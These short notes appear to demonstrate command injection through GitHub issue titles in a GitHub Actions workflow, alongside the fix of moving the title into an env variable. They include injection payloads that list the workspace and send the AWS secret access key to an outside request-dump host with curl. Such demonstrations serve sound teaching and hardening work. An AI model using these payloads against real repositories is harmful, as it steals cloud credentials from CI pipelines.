Issue #1: bug in code

Issue #2: bug"; ls $GITHUB_WORKSPACE"

Issue #3: bug"; curl --request POST --data lukas=$AWS_SECRET_ACCESS_KEY https://httpdump.app/dumps/8c69206a-a72b-44b6-a2fc-2b7b3c837cf5"

Move the line
    issue_title="${{ github.event.issue.title }}"
under env:
    issue_title: "${{ github.event.issue.title }}"

Issue #4: bug"; curl --request POST --data lukas=$AWS_SECRET_ACCESS_KEY https://httpdump.app/dumps/8c69206a-a72b-44b6-a2fc-2b7b3c837cf5"